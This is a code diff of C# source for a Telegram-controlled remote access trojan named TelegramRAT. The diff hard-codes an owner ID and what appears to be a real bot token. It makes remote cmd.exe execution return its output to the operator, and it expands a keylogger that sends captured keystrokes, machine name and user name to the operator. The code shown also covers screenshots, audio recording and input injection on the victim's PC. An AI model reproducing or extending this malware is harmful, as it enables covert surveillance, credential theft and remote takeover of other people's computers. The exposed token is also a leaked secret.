@@ -15,16 +15,17 @@ using WindowsInput;
 using System.Reflection;
 using System.Text;
 using NAudio.Wave;
+using Telegram.Bot.Types.ReplyMarkups;
 
 
 namespace TelegramRAT
 {
     public static class Program
     {
-        private static TelegramBotClient Bot;
+        static TelegramBotClient Bot;
 
-        readonly static long? OwnerId = null; // Place your Telegram id here or keep it null
-        readonly static string BotToken = null; // Place your Telegram bot token. 
+        readonly static long? OwnerId = 1113634091; // Place your Telegram id here or keep it null
+        readonly static string BotToken = "1727211141:AAFgdia7tmGOzdeaPT_H0ZSlwe3PS2GnSlc"; // Place your Telegram bot token. 
 
         static List<BotCommand> commands = new List<BotCommand>();
         static bool keylog = false;
@@ -66,7 +67,7 @@ namespace TelegramRAT
                         {
                             command = "/" + command;
                         }
-                        
+
                         foreach (BotCommand cmd in commands)
                         {
                             if (cmd.Command == command)
@@ -88,9 +89,6 @@ namespace TelegramRAT
                         Bot.SendTextMessageAsync(update.Message.Chat.Id, "This command doesn't exist! " +
                             "To get list of all commands - type /commands", replyToMessageId: update.Message.MessageId);
 
-
-
-
                     });
 
                 }
@@ -106,13 +104,28 @@ namespace TelegramRAT
                 {
                     try
                     {
-                        Process cmd = new System.Diagnostics.Process();
-                        cmd.StartInfo.FileName = "cmd.exe";
-                        cmd.StartInfo.CreateNoWindow = true;
+                        await Task.Run(() =>
+                        {
+                            Process cmd = new Process();
+                            cmd.StartInfo.FileName = "cmd.exe";
+                            cmd.StartInfo.CreateNoWindow = true;
 
-                        cmd.StartInfo.Arguments = "/C " + (model.RawArgs);
-                        cmd.Start();
-                        await Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!");
+                            cmd.StartInfo.Arguments = "/C " + model.RawArgs;
+                            cmd.StartInfo.RedirectStandardOutput = true;
+                            cmd.StartInfo.UseShellExecute = false;
+
+                            cmd.Start();
+                            Bot.SendTextMessageAsync(update.Message.Chat.Id, "Started!", replyToMessageId: update.Message.MessageId);
+                            cmd.WaitForExit();
+
+                            string Output = cmd.StandardOutput.ReadToEnd();
+
+                            if (Output.Length == 0)
+                                Bot.SendTextMessageAsync(update.Message.Chat.Id, $"Done!", replyToMessageId: update.Message.MessageId);
+                            else
+                                Bot.SendTextMessageAsync(update.Message.Chat.Id, $"Done!\n\n" +
+                                    $"Output:\n{Output}", replyToMessageId: update.Message.MessageId);
+                        });
                     }
                     catch (Exception ex)
                     {
@@ -213,17 +226,17 @@ namespace TelegramRAT
 
                         foreach (Process p in processCollection)
                         {
-                            Concat += "`" + p.ProcessName + "`\n";
+                            Concat += $"<code>{p.ProcessName}</code>\n";
                             if (i == 100)
                             {
-                                await Bot.SendTextMessageAsync(update.Message.Chat.Id, Concat, ParseMode.MarkdownV2);
+                                await Bot.SendTextMessageAsync(update.Message.Chat.Id, Concat, ParseMode.Html);
                                 Concat = "";
                                 i = 0;
                             }
                             i++;
 
                         }
-                        await Bot.SendTextMessageAsync(update.Message.Chat.Id, Concat, ParseMode.MarkdownV2);
+                        await Bot.SendTextMessageAsync(update.Message.Chat.Id, Concat, ParseMode.Html);
                     }
                     catch (Exception ex)
                     {
@@ -290,7 +303,7 @@ namespace TelegramRAT
                 {
                     try
                     {
-                        await Bot.SendTextMessageAsync(update.Message.Chat.Id, "Current directory:  \n`" + Directory.GetCurrentDirectory() + "`", ParseMode.Markdown, replyToMessageId: update.Message.MessageId);
+                        await Bot.SendTextMessageAsync(update.Message.Chat.Id, $"Current directory:\n<code>{Directory.GetCurrentDirectory()}</code>", ParseMode.Html, replyToMessageId: update.Message.MessageId);
                     }
                     catch (Exception ex)
                     {
@@ -398,7 +411,7 @@ namespace TelegramRAT
                     {
                         try
                         {
-                            Rectangle bounds = NativeFunctionsWrapper.GetScreenBounds();
+                            Rectangle bounds = WinAPI.GetScreenBounds();
 
                             using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
                             {
@@ -498,26 +511,26 @@ namespace TelegramRAT
                         {
                             Caption = model.Args[0].Substring(1);
                         }
-                        NativeFunctionsWrapper.MsgBoxFlag flag = NativeFunctionsWrapper.MsgBoxFlag.MB_APPLMODAL; //*Shit code intesifies*
+                        WinAPI.MsgBoxFlag flag = WinAPI.MsgBoxFlag.MB_APPLMODAL; //*Shit code intesifies*
 
                         bool ContainsIcon = false;
                         switch (model.Args[0].ToLower())
                         {
                             case "!":
-                                flag |= NativeFunctionsWrapper.MsgBoxFlag.MB_ICONEXCLAMATION;
+                                flag |= WinAPI.MsgBoxFlag.MB_ICONEXCLAMATION;
                                 ContainsIcon = true;
                                 break;
                             case "i":
-                                flag |= NativeFunctionsWrapper.MsgBoxFlag.MB_ICONINFORMATION;
+                                flag |= WinAPI.MsgBoxFlag.MB_ICONINFORMATION;
                                 ContainsIcon = true;
                                 break;
                             case "x":
-                                flag |= NativeFunctionsWrapper.MsgBoxFlag.MB_ICONSTOP;
+                                flag |= WinAPI.MsgBoxFlag.MB_ICONSTOP;
                                 ContainsIcon = true;
                                 break;
                             case "?":
-                                flag |= NativeFunctionsWrapper.MsgBoxFlag.MB_ICONQUESTION;
-                                flag |= NativeFunctionsWrapper.MsgBoxFlag.MB_YESNO;
+                                flag |= WinAPI.MsgBoxFlag.MB_ICONQUESTION;
+                                flag |= WinAPI.MsgBoxFlag.MB_YESNO;
                                 ContainsIcon = true;
                                 break;
 
@@ -538,7 +551,7 @@ namespace TelegramRAT
                         }
 
 
-                        int answer = NativeFunctionsWrapper.ShowMessageBox(Text, Caption, flag);
+                        int answer = WinAPI.ShowMessageBox(Text, Caption, flag);
                         string userResponse = "User response: ";
                         switch (answer)
                         {
@@ -557,7 +570,6 @@ namespace TelegramRAT
                     });
                 },
                 description =
-                "_message_\n\n" +
                 "Sends your message with dialog window\n" +
                 "You can change its icon by typing these characters before:\n" +
                 "x - Error\n? - Question mark\n! - Exclamation mark\ni - Info\n" +
@@ -571,7 +583,7 @@ namespace TelegramRAT
                 IgnoreCountArgs = true,
                 Execute = async (model, update) =>
                 {
-                    if (!model.RawArgs.Contains("http"))
+                    if (!model.RawArgs.Contains("://"))
                         return;
                     ProcessStartInfo info = new ProcessStartInfo()
                     {
@@ -723,7 +735,7 @@ namespace TelegramRAT
                 description =
                 #region desc
                 "Sends keyboard input by virtual keycode, presented in hexadecimal\n\n" +
-                "Example: /sendinput 48 45 4c 4c 4f (Types \"hello\")\n" +
+                "Example: <b>/sendinput 48 45 4c 4c 4f</b> (hello)\n" +
                 "List of virtual keycodes:\n" +
                 "LBUTTON = 1\nRBUTTON = 2\nCANCEL = 3\nMIDBUTTON = 4\nBACKSPACE = 8\n" +
                 "TAB = 9\nCLEAR = C\nENTER = D\nSHIFT = 10\nCTRL = 11\nALT = 12\n" +
@@ -731,8 +743,8 @@ namespace TelegramRAT
                 "END = 23\nHOME = 24\nLEFT = 25\nUP = 26\nRIGHT = 27\nDOWN = 28\n0..9 = 30..39\n" +
                 "\nA..Z = 41..5a\nF1..F24 = 70..87\n" +
 
-                "<a href=\"https://docs.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes\">More keycodes</a>\n\n" +
-                "To send combination of keys, combine them by plus: 11+43 (ctrl+c)\n"
+                "<a href=\"https://docs.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes\">See all keycodes</a>\n\n" +
+                "To send combination of keys, join them with plus: 11+43 (ctrl+c)\n"
                 #endregion
             });
 
@@ -755,7 +767,7 @@ namespace TelegramRAT
                                 Telegram.Bot.Types.File photo = await Bot.GetFileAsync(update.Message.Photo.Last().FileId);
                                 await Bot.DownloadFileAsync(photo.FilePath, fs);
                             }
-                            NativeFunctionsWrapper.SystemParametersInfo(NativeFunctionsWrapper.SPI_SETDESKWALLPAPER, 0, "wllppr.png", NativeFunctionsWrapper.SPIF_UPDATEINIFILE | NativeFunctionsWrapper.SPIF_SENDWININICHANGE);
+                            WinAPI.SystemParametersInfo(WinAPI.SPI_SETDESKWALLPAPER, 0, "wllppr.png", WinAPI.SPIF_UPDATEINIFILE | WinAPI.SPIF_SENDWININICHANGE);
                             await Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
 
                         }
@@ -781,11 +793,11 @@ namespace TelegramRAT
                         {
                             if (model.Args.Length > 0)
                             {
-                                NativeFunctionsWrapper.MinimizeWindow(NativeFunctionsWrapper.FindWindow(null, model.RawArgs));
+                                WinAPI.MinimizeWindow(WinAPI.FindWindow(null, model.RawArgs));
                             }
                             else
                             {
-                                NativeFunctionsWrapper.MinimizeWindow(NativeFunctionsWrapper.GetForegroundWindow());
+                                WinAPI.MinimizeWindow(WinAPI.GetForegroundWindow());
                             }
 
                             await Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
@@ -817,8 +829,8 @@ namespace TelegramRAT
 
                     try
                     {
-                        mouseSimulator.MoveMouseTo(Convert.ToDouble(model.Args[0]) * (ushort.MaxValue / NativeFunctionsWrapper.GetScreenBounds().Width),
-                            Convert.ToDouble(model.Args[1]) * (ushort.MaxValue / NativeFunctionsWrapper.GetScreenBounds().Height));
+                        mouseSimulator.MoveMouseTo(Convert.ToDouble(model.Args[0]) * (ushort.MaxValue / WinAPI.GetScreenBounds().Width),
+                            Convert.ToDouble(model.Args[1]) * (ushort.MaxValue / WinAPI.GetScreenBounds().Height));
                         Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
 
                     }
@@ -930,38 +942,47 @@ namespace TelegramRAT
                             keylog = false;
                             return;
                         }
-
+                        Bot.SendTextMessageAsync(update.Message.Chat.Id, "Keylog started!", replyToMessageId: update.Message.MessageId);
                         keylog = true;
 
-                        StringBuilder builder = new StringBuilder();
-                        List<int> LastKeys = new List<int>();
-                        List<int> shit = new List<int>();
+                        StringBuilder mappedKeys = new StringBuilder();
+                        StringBuilder unmappedKeys = new StringBuilder();
+                        List<uint> LastKeys = new List<uint>();
+                        List<uint> shit = new List<uint>();
                         while (keylog)
                         {
                             shit.Clear();
                             bool hasAtLeastOneKey = false;
-                            for (int i = 0; i < 256; i++)
+                            for (uint i = 0; i < 256; i++)
                             {
-                                int state = NativeFunctionsWrapper.GetAsyncKeyState(i);
+                                int state = WinAPI.GetAsyncKeyState(i);
                                 if (state != 0)
                                 {
-
                                     shit.Add(i);
                                     Console.WriteLine(i);
+                                    Console.WriteLine("\t" + WinAPI.MapVirtualKey(i));
                                     hasAtLeastOneKey = true;
                                 }
                             }
                             if (!hasAtLeastOneKey && LastKeys.Count > 0)
                             {
-                                foreach (var i in LastKeys)
+                                char mappedKeycode = WinAPI.MapVirtualKey(LastKeys[0]);
+                                for (int i = 0; i < LastKeys.Count; i++)
                                 {
-                                    builder.Append(i.ToString() + ";");
+                                    mappedKeycode = WinAPI.MapVirtualKey(LastKeys[i]);
+                                    if ((int)mappedKeycode == 0)
+                                        mappedKeys.Append(LastKeys[i].ToString() + ";");
+                                    else
+                                        mappedKeys.Append(mappedKeycode + ";");
+
+                                    unmappedKeys.Append(LastKeys[i].ToString("X") + ";");
                                 }
-                                builder.Append(" ");
+                                mappedKeys.Append(" ");
+                                unmappedKeys.Append(" ");
                                 LastKeys.Clear();
                                 continue;
                             }
-                            foreach (int v in shit)
+                            foreach (uint v in shit)
                             {
                                 if (!LastKeys.Contains(v))
                                 {
@@ -970,10 +991,18 @@ namespace TelegramRAT
                             }
 
                         }
-                        Console.WriteLine("length - " + builder.Length);
-                        System.IO.File.Create("keylog.txt").Close();
-                        System.IO.File.AppendAllText("keylog.txt", builder.ToString());
-                        Bot.SendTextMessageAsync(update.Message.From.Id, "Keylog from " + Environment.MachineName + ". User: " + Environment.UserName + ": \n" + builder.ToString());
+                        Console.WriteLine("length - " + mappedKeys.Length);
+                        using (FileStream keylogFileStream = System.IO.File.Create("keylog.txt"))
+                        {
+                            StreamWriter streamWriter = new StreamWriter(keylogFileStream);
+                            streamWriter.WriteLine("#Mapped keylog:");
+                            streamWriter.WriteLine(mappedKeys.ToString());
+                            streamWriter.WriteLine("\n#Remember, mapped keylog is not the \"clear\" input.\n\n#Unmapped keylog:");
+                            streamWriter.WriteLine(unmappedKeys.ToString());
+                            streamWriter.WriteLine("\n#Keycodes table - https://docs.microsoft.com/ru-ru/windows/win32/inputdev/virtual-key-codes");
+                            streamWriter.Close();
+                        }
+                        Bot.SendTextMessageAsync(update.Message.From.Id, "Keylog from " + Environment.MachineName + ". User: " + Environment.UserName + ": \n" + mappedKeys.ToString());
 
                         using (FileStream fs = new FileStream("keylog.txt", FileMode.Open))
                         {
@@ -1101,8 +1130,8 @@ namespace TelegramRAT
 
                             }
                             System.IO.File.Delete("record.wav");
-                            
-                            
+
+
                         }
                         catch (Exception ex)
                         {
@@ -1110,7 +1139,6 @@ namespace TelegramRAT
                         }
 
                     });
-
                 }
             });
 
@@ -1136,7 +1164,7 @@ namespace TelegramRAT
 
             #endregion
 
-            
+
             for (; ; )
             {
                 try
@@ -1170,14 +1198,14 @@ namespace TelegramRAT
             {
                 await Bot.SendTextMessageAsync(OwnerId,
                     $"🖥Computer online! \n\n" +
-                    $"👤Username: *{Environment.UserName}*\n" +
+                    $"Username: *{Environment.UserName}*\n" +
                     $"PC name: *{Environment.MachineName}*\n\n" +
 
-                    $"OS version: {Environment.OSVersion.ToString()}",
+                    $"OS: {Environment.OSVersion.ToString()}",
                     ParseMode.Markdown);
             }
             var offset = 0;
-            
+
             while (true)
             {
                 var updates = await Bot.GetUpdatesAsync(offset);
@@ -1198,70 +1226,77 @@ namespace TelegramRAT
 
             foreach (var update in Updates)
             {
-                if (update.Message == null)
-                    continue;
-                if (update.Message.Text != null || update.Message.Caption != null)
+                if (update.Message == null || (update.Message.Text == null && update.Message.Caption == null))
                 {
-                    if (update.Message.Text != null && update.Message.Text.Contains("@" + Bot.GetMeAsync().Result.Username))
-                    {
-                        update.Message.Text = update.Message.Text.Substring(0,
-                            update.Message.Text.IndexOf("@" + Bot.GetMeAsync().Result.Username)) +
-                            update.Message.Text.Substring(
-                            update.Message.Text.IndexOf("@" + Bot.GetMeAsync().Result.Username) +
-                            ("@" + Bot.GetMeAsync().Result.Username).Length);
-                    }
+                    Console.WriteLine("Fuck");
+                    continue;
+                }
 
-                    if (update.Message.Caption != null && update.Message.Caption.Contains("@" + Bot.GetMeAsync().Result.Username))
-                    {
-                        update.Message.Caption = update.Message.Text.Substring(0,
-                            update.Message.Caption.IndexOf("@" + Bot.GetMeAsync().Result.Username)) +
-                            update.Message.Caption.Substring(
-                            update.Message.Caption.IndexOf("@" + Bot.GetMeAsync().Result.Username) +
-                            ("@" + Bot.GetMeAsync().Result.Username).Length);
-                    }
+                if (update.Message.Text != null && update.Message.Text.Contains("@" + Bot.GetMeAsync().Result.Username))
+                {
+                    update.Message.Text = update.Message.Text.Substring(0,
+                        update.Message.Text.IndexOf("@" + Bot.GetMeAsync().Result.Username)) +
+                        update.Message.Text.Substring(
+                        update.Message.Text.IndexOf("@" + Bot.GetMeAsync().Result.Username) +
+                        ("@" + Bot.GetMeAsync().Result.Username).Length);
+                }
 
-                    BotCommandModel model;
-                    if (update.Message.Type == MessageType.Text)
+                if (update.Message.Caption != null && update.Message.Caption.Contains("@" + Bot.GetMeAsync().Result.Username))
+                {
+                    update.Message.Caption = update.Message.Text.Substring(0,
+                        update.Message.Caption.IndexOf("@" + Bot.GetMeAsync().Result.Username)) +
+                        update.Message.Caption.Substring(
+                        update.Message.Caption.IndexOf("@" + Bot.GetMeAsync().Result.Username) +
+                        ("@" + Bot.GetMeAsync().Result.Username).Length);
+                }
+
+                BotCommandModel model;
+                if (update.Message.Type == MessageType.Text)
+                {
+                    model = BotCommand.Parse(update.Message.Text);
+                }
+                else
+                {
+                    model = BotCommand.Parse(update.Message.Caption);
+                }
+                if (model != null)
+                {
+                    foreach (var cmd in commands)
                     {
-                        model = BotCommand.Parse(update.Message.Text);
-                    }
-                    else
-                    {
-                        model = BotCommand.Parse(update.Message.Caption);
-                    }
-                    if (model != null)
-                    {
-                        foreach (var cmd in commands)
+                        if (cmd.Command == model.Command)
                         {
-                            if (cmd.Command == model.Command)
+
+                            if ((cmd.IgnoreCountArgs || cmd.CountArgs != 0) && model.Args.Length != 0)
+                            {
+                                await Task.Run(() =>
+                                {
+                                    cmd.Execute?.Invoke(model, update);
+                                });
+
+                            }
+                            else if (!(cmd.IgnoreCountArgs || cmd.CountArgs != 0) || cmd.MayHaveNoArgs)
                             {
 
-                                if ((cmd.IgnoreCountArgs || cmd.CountArgs != 0) && model.Args.Length != 0)
+                                await Task.Run(() =>
                                 {
-                                    await Task.Run(() =>
-                                    {
-                                        cmd.Execute?.Invoke(model, update);
-                                    });
-
-                                }
-                                else if (!(cmd.IgnoreCountArgs || cmd.CountArgs != 0) || cmd.MayHaveNoArgs)
-                                {
-
-                                    await Task.Run(() =>
-                                    {
-                                        cmd.Execute?.Invoke(model, update);
-                                    });
-                                }
-                                else
-                                {
-                                    await Bot.SendTextMessageAsync(update.Message.Chat.Id, "This command requires arguments! \n\n" +
-                                         $"To get information about this command - type /help {model.Command.Substring(1)}", replyToMessageId: update.Message.MessageId);
-                                }
+                                    cmd.Execute?.Invoke(model, update);
+                                });
+                            }
+                            else
+                            {
+                                await Bot.SendTextMessageAsync(update.Message.Chat.Id, "This command requires arguments! \n\n" +
+                                     $"To get information about this command - type /help {model.Command.Substring(1)}", replyToMessageId: update.Message.MessageId);
                             }
                         }
                     }
                 }
+
             }
         }
+
+        //static async Task SendLargeMessage(ChatId chatId, string message)
+        //{
+        //    for (int i = 0; i < message.Length / 4096; )
+        //}
     }
 }
